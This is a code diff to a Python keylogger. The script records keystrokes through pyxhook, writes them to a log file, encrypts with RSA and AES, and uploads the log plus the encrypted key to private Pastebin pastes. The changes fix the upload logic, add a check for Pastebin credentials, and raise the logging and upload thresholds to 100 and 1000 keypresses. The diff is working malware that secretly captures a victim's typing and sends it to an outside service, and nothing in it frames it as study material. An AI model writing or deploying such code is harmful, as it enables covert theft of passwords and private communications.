@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import pastebin_creds
-import os, sys, random
+import os, sys, random, pdb
 import pyxhook
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
@@ -13,8 +13,9 @@ def log(message, verbose):
 
 def upload_to_pastebin(name, contents, pb_api, pb_api_key, pb_user_key):
     try:
+        print(name)
         url = pb_api.paste(pb_api_key, 
-                           contents,
+                           api_paste_code=contents,
                            paste_name=name,
                            api_user_key=pb_user_key,
                            paste_private='private',
@@ -76,8 +77,8 @@ with open(log_file, 'w') as f:
 # so instead we buffer and flush it to file every 100 keypresses
 buff = dict()
 buff['buff'] = ''
-buff['num_keypresses_between_log_updates'] = 10
-buff['num_keypresses_before_upload'] = 10
+buff['num_keypresses_between_log_updates'] = 100
+buff['num_keypresses_before_upload'] = 1000
 buff['keypress_log_count'] = 0
 buff['keypress_upload_count'] = 0
 
@@ -98,13 +99,17 @@ def getOnKeyPress(buff, pb_api, pb_api_key, pb_user_key):
             buff['buff'] = ''
             buff['keypress_log_count'] = 0
         if buff['keypress_upload_count'] == \
-           buff['num_keypresses_before_upload']:
+           buff['num_keypresses_before_upload'] and \
+           pastebin_creds.username and \
+           pastebin_creds.password and \
+           pastebin_creds.api_dev_key:
             with open(log_file, 'r') as f:
+                payload = f.read()
                 upload_to_pastebin(os.path.basename(
-                                        '{}_aes'.format(encrypted_aes_key)), 
-                                   f.read(), pb_api, pb_api_key, pb_user_key)
+                                        '{}_aes'.format(log_file)), 
+                                   encrypted_aes_key, pb_api, pb_api_key, pb_user_key)
                 upload_to_pastebin(os.path.basename(log_file),
-                                   f.read(), pb_api, pb_api_key, pb_user_key)
+                                   payload, pb_api, pb_api_key, pb_user_key)
             buff['keypress_upload_count'] = 0
 
     return onKeyPress
